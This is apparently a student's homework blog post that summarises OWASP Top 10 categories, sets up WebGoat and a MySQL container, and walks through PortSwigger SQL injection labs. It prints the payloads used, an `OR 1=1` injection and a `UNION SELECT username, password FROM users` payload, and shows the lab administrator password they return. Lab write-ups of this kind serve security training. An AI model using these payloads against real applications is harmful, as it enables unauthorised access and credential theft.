---
title: h4 Johnny Tables
published: true
---

# Summary

## Broken Access Control (BAC)

It is TOP 1 of OWASP 2021 and still TOP 1 of OWASP 2025. It is a common vulnerability that allows attackers to access unauthorized resources and perform actions that they shouln't. Like changing an URL parameter to access a different user's data.

Other vulnerabilities are easier to find than this one (sql map for SQLi for example), but this one is more complex and requires more knowledge about the application.

## Security Misconfiguration

It is TOP 5 of OWASP 2021 and went up to TOP 2 of OWASP 2025. Happends when the application configuration is left by default, with weak values or not even present. If you find (for example) an admin account with default credentials then you have a Security Misconfiguration.

Why buy a super expensive and secure solution and then leave the testing account with no creditals and full admin access open for the public?

## Vulnerable and Outdated Components

It is TOP 6 of OWASP 2021 and went up to TOP 3 of OWASP 2025 with a different name that covers more than just components. Using libraries, frameworks, or other software modules that have known vulnerabilities.

An example of this is using an old version of the Log4j library that is susceptible to the Log4Shell vulnerability, or running a web application on an unpatched version of a framework like Apache Struts that allows for Remote Code Execution (RCE).

## Injection

It went from TOP 3 of OWASP 2021 to TOP 5 of OWASP 2025. User sends data that will be interpreted without proper validation and sanitation. Not only includes SQLi but also NoSQLi, OSi, etc.

It's good to see this dropping from #1, likely due to modern frameworks automatically handling data sanitization (like ORMs). However, the fact that it is still #3 means legacy code and "raw" queries are still everywhere.

## Bobby Tables meme

![Bobby Tables meme](https://imgs.xkcd.com/comics/exploits_of_a_mom_2x.png)

It is actually a good meme, it shows that SQLi is not that hard to find and that it is a common vulnerability. There is also another version of the meme with NoSQLi in a redis database (A teacher of mine made it). 

![NoSQLi meme](https://raw.githubusercontent.com/Mineja2017/security-information.mineja2017.github.io/refs/heads/main/assets/h4/bobby.png)

# Task a: Installing Web-GOAT

I alrready have JDK installed. You can check it with:
```bash
java -version
```

Now we need to download the Web-GOAT. I downloaded The version provided by the teacher (https://github.com/WebGoat/WebGoat/releases/download/v2023.4/webgoat-2023.4.jar).

```bash
wget https://github.com/WebGoat/WebGoat/releases/download/v2023.4/webgoat-2023.4.jar
```
Now we run it in a rarely used port:
```bash
java -Dfile.encoding=UTF-8 -Dwebgoat.port=8888 -Dwebwolf.port=9090 -jar webgoat-2023.4.jar
```
And now we can access it at http://localhost:8888

# Task b: Solving Developer Tools

This module is about using the F12 key to open the developer tools and inspect the web page. The task are de following:

1. Using the console to run a javascript function to get the "flag" (this is usually how the solution of this type of exercises is called):

```javascript
webgoat.customjs.phoneHome();
```
This will give a number that when sended it mark the exercise as completed.

2. Analyse a HTTP petition and find the solution:

We click the send button and look at the body of the request:
```json
{
    "networkNum": "27.590600140300303"
}
```
Both challenges are solved:

![Solved challenges](https://raw.githubusercontent.com/Mineja2017/security-information.mineja2017.github.io/refs/heads/main/assets/h4/solved_F12.png)

# Task c: Update
We update the system packages:
```bash
sudo apt update && sudo apt upgrade
```
![Update](https://raw.githubusercontent.com/Mineja2017/security-information.mineja2017.github.io/refs/heads/main/assets/h4/update.png)

# Task d: SQL

As I alrready solved the SQLzoo exercises for the previous homework, I'm going to skip this task ad show some real CRUD operations on a MySQL database As mention in the instructions.

![MySQL](https://raw.githubusercontent.com/Mineja2017/security-information.mineja2017.github.io/refs/heads/main/assets/h4/mysql.png)

```sql
-- Create a simple table for demonstration
CREATE TABLE products (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100),
    price DECIMAL(10, 2)
);

-- CRUD: CREATE
INSERT INTO products (name, price) VALUES ('Laptop', 1200.00);

-- CRUD: READ
SELECT * FROM products;

-- CRUD: UPDATE
UPDATE products SET price = 1100.00 WHERE name = 'Laptop';

-- CRUD: DELETE
DELETE FROM products WHERE name = 'Laptop';
```

For the demo I'm going to use a docker system for fast setup:

```bash
docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=test123 -d mysql:latest
```

Now we can access it with the following command:
```bash
docker exec -it some-mysql mysql -u root -p
```

![MySQL](https://raw.githubusercontent.com/Mineja2017/security-information.mineja2017.github.io/refs/heads/main/assets/h4/login_mysql.png)

And now we can run the SQL commands:

![MySQL](https://raw.githubusercontent.com/Mineja2017/security-information.mineja2017.github.io/refs/heads/main/assets/h4/mysql_demo.png)

# Task e: PortSwigger

This task is about the most basic SQLi attack. A retrival of information abusing the `' OR 1=1` method.

We know that this query is executed:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

As we control the category parameter, we can inject a `OR 1=1` to always return true:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 -- -AND released = 1
```
Now we can see all the products:

![SQLi](https://raw.githubusercontent.com/Mineja2017/security-information.mineja2017.github.io/refs/heads/main/assets/h4/solved_sql1.png)

Note that here the parameter that we controlled was `category` which is passed through a GET request. We don't need to open any tool like Burp Suite or F12 to solve the lab as the payload is automaticly URL encoded and works.

# Voluntary task

I have all SQLi labs completed in portswigger, Let's open Burp Suite and solve this [lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables).

Note that for the correct usage of Burp Suite we need to set it as the proxy of the browser and install the certificate [Instructions](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate). Or use the built-in browser of Burp Suite.

First thing we do is go arround the website and see what we can find. We have the same filter as before so let's see the petition on Burp Suite:

```http
GET /filter?category=Lifestyle HTTP/2
Host: 0a9d003c0466fb708393bfd3000000ab.web-security-academy.net
Cookie: session=1tjEHAhTrt56A9jOJpiecXEOIS5oPT6h
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-Gpc: 1
Accept-Language: es-ES,es;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9d003c0466fb708393bfd3000000ab.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Let's see if the category parameter is vulnerable to SQLi by injecting a `'`:

![Error500](https://raw.githubusercontent.com/Mineja2017/security-information.mineja2017.github.io/refs/heads/main/assets/h4/500.png)

As stated in the instruction we need to get the `administrator` password from the `users` table. We can't extract information from other tables of the database with the `OR 1=1` method. We need to use the `UNION` operator to extract information from other tables. For example if the query is:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

We can inject the following payload:

```sql
' UNION SELECT username, password FROM users -- -
```

Which will return the username and password of all users in the database mixed with real products.

```html
<tr>
    <th>administrator</th>
    <td>qte9f6exwkxcnxj6nhom</td>
</tr>
```
![Solved](https://raw.githubusercontent.com/Mineja2017/security-information.mineja2017.github.io/refs/heads/main/assets/h4/solved_sql2.png)
